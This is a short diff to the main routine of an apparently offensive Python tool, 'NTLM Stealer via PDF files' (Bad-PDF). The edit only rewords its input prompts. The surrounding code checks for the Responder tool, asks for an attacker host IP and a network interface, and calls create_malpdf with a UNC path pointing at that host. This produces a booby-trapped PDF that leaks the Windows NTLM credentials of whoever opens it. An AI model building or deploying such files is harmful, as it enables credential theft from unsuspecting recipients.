@@ -82,17 +82,17 @@ trailer
 
 if __name__ == "__main__":
     try:
-        print("NTLM Stealer PDF")
+        print("NTLM Stealer via PDF files")
 
         if os.path.isfile(responder):
             print(f"Responder detected: {responder}")
         else:
             print("Responder not found..")
-            responder = input("Please enter responder path (Default /usr/sbin/responder): \n") or responder
+            responder = input("Enter responder path (Default /usr/sbin/responder): \n") or responder
 
-        host = input("Please enter Bad-PDF host IP: \n")
-        filename = input("Please enter output file name: \n")
-        interface = input("Please enter the interface name to listen (Default eth0): \n") or interface
+        host = input("Enter Bad-PDF host IP: \n")
+        filename = input("Enter output file name: \n")
+        interface = input("Enter the network interface name to listen (Default eth0): \n") or interface
 
         create_malpdf(filename, '\\\\' + '\\\\' + host + '\\\\')
         print(f"Bad PDF {filename} created")
